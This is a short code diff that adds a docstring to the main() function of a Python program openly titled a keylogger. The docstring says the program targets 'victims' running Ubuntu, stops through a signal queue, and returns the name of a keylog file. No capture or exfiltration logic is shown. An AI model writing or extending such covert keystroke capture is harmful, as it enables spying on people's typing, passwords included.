@@ -359,6 +359,18 @@ def __perform_keylog(event_x: str,
 
 
 def main(signal_queue: queue.Queue):
+    """
+    Performs the keylogging process once executed
+
+    @attention: **// COMPATIBILITY WARNING //**
+        Keylogger only works for victims with Ubuntu OS
+
+    @param signal_queue:
+        A queue used to stop the keylogging processes
+
+    @return: file_name
+        A string containing the name of the keylog file
+    """
     try:
         # Print Keylog Title
         print("===================================== || KEYLOGGER PROGRAM || =====================================")
